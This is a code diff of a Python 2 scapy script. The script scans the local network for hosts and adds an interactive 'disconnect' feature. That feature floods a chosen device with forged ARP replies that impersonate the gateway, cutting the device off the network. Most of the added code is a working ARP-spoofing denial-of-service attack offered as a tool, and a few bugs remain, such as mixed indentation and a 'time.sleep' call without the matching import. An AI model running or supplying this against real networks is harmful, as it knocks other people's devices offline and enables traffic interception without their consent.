@@ -1,10 +1,10 @@
 from scapy.all import *
 import os, sys
 import traceback
+from time import sleep
 import urllib2 as urllib
+import spoof
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
-
-nodelist=[]
 
 #The function returns your current working interface (wlan or wifi)
 def getDefaultInterface(returnNet=False):
@@ -21,7 +21,8 @@ def getDefaultInterface(returnNet=False):
         return net
 
     iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
-    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
+    #print(iface_routes)
+    network, netmask, _, interface, address,metric = max(iface_routes, key=lambda item:item[1])
     net = to_CIDR_notation(network, netmask)
     if net:
         if returnNet:
@@ -45,7 +46,7 @@ def getDefaultInterfaceMAC():
 #This returns your Gateway IP
 def getGatewayIP():
     try:
-        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
+        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False) #sr()-for sending and receiving packets
         return getGateway_p.src
     except:
         # request gateway IP address (after failed detection by scapy)
@@ -73,9 +74,11 @@ def scanNetwork(network):
     import nmap
     nm = nmap.PortScanner()
     a = nm.scan(hosts=network, arguments='-sP')
+    #print(a)
     for k, v in a['scan'].iteritems():
         if str(v['status']['state']) == 'up':
             try:
+            	#print(k,v)
                 returnList.append([str(v['addresses']['ipv4']), str(v['addresses']['mac'])])
             except:
                 pass
@@ -86,6 +89,7 @@ def getNodes():
     global nodelist
     try:
         nodelist = scanNetwork(getDefaultInterface(True))
+        #print('nodes ********************',nodelist)
     except KeyboardInterrupt:
         printf("Terminated.")
     except:
@@ -98,26 +102,109 @@ def generateIPs():
     liveIPs = []
     for host in nodelist:
         liveIPs.append(host[0])
+        
+def heading():	#yet to be designed
+	print("{0}"+"Welcome  !!"+"{1}").format(MAGENTA,END)
 
-print("Running")
-defaultInterface = getDefaultInterface()
-defaultGatewayIP = getGatewayIP()
-defaultInterfaceMac = getDefaultInterfaceMAC()
-print("Network Details: ")
-print("Default Network Interface: " + defaultInterface)
-print("Your Gateway IP: " + defaultGatewayIP)
-print("Your MAC Address: " + defaultInterfaceMac)
-getNodes()
-print(nodelist) #This list contains both IP and MAC addresses
-print("IP thinggy")
-print(liveIPs) #This list only contains their IP addresses
+	sys.stdout.write(RED + """ 
+		**       **     ***     *     *     *
+		**	 **    *   *    *     *     *
+		***********    ******   *     *     *
+		**       **    *    *   *     *     *
+		**       **    *    *   ****** ******
+	""" + END)
 
-print("Real Thinggy")
-for i in range(len(liveIPs)):
-    mac = ""
-    for host in nodelist:
-        if host[0] == liveIPs[i]:
-            mac = host[1]
-    vendor = resolveMac(mac)
-    #print(mac)
-    print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN, END)
+def display():
+	for i in range(len(liveIPs)):
+		mac = ""
+	    	for host in nodelist:
+			if host[0] == liveIPs[i]:
+				mac = host[1]
+	    	vendor = resolveMac(mac)
+	   	#print(mac)
+	   	print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
+	
+
+def disconnect():
+	choice=raw_input("Choose a node to disconnect from network : ")
+	target_ip = liveIPs[int(choice)]
+	target_mac = nodelist[int(choice)][1]
+	print('disconneting device with ip ' +target_ip+"  and mac " +target_mac)
+	try:
+		while True:
+			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
+			time.sleep(2)
+	except KeyboardInterrupt:
+		count =1
+		while count!=10:
+			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
+			count += 1
+			time.sleep(0.5)
+		print("device disconnected!!")
+		
+		
+
+def sendPacket(my_mac,gateway_ip,target_ip,target_mac):#need to be modify a bit
+	ether = Ether()
+	ether.src = my_mac
+	
+	arp=ARP()
+	arp.psrc = gateway_ip
+	arp.hwsrc = my_mac
+	
+	arp=arp
+	arp.pdst = target_ip
+	arp.hwdst = target_mac
+	
+	ether = ether
+	ether.src = my_mac
+	ether.dst = target_mac
+	
+	arp.op=2
+	
+	packet = ether / arp
+	sendp(x=packet,verbose=False)
+		
+	
+	
+def main():
+	print("{0}Scanning your network, hang on...{1}\r".format(BLUE, END))
+	print("{0}Default Network Interface:{1} " + defaultInterface+'{2}').format(GREEN,RED,END)
+	print("{0}Your Gateway IP: {1}" + defaultGatewayIP+'{2}').format(GREEN,RED,END)
+	print("{0}Your MAC Address:{1} " + defaultInterfaceMac+'{2}').format(GREEN,RED,END)
+	print("{0}Hosts up : "+str(len(nodelist))+'{2}').format(GREEN,RED,END)
+	#print(nodelist) #This list contains both IP and MAC addresses
+	#print("IP thinggy")
+	#print(liveIPs) #This list only contains their IP addresses
+
+	print("{0}connected devices {1}::){2}").format(YELLOW,GREEN,END)
+	for i in range(len(liveIPs)):
+	    mac = ""
+	    for host in nodelist:
+		if host[0] == liveIPs[i]:
+		    mac = host[1]
+	    vendor = resolveMac(mac)
+	    #print(mac)
+	    print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
+	    
+	try:
+		while True:
+			if len(nodelist) <=1 :
+				print("Can't kickout")
+				raise SystemExit
+			else:
+				disconnect()
+				raise SystemExit
+				
+				
+	except KeyboardInterrupt:
+		print('error!!')
+		
+				
+if __name__ == '__main__':
+
+	defaultInterface = getDefaultInterface()
+	defaultGatewayIP = getGatewayIP()
+	defaultInterfaceMac = getDefaultInterfaceMAC()
+	getNodes()
+	main()
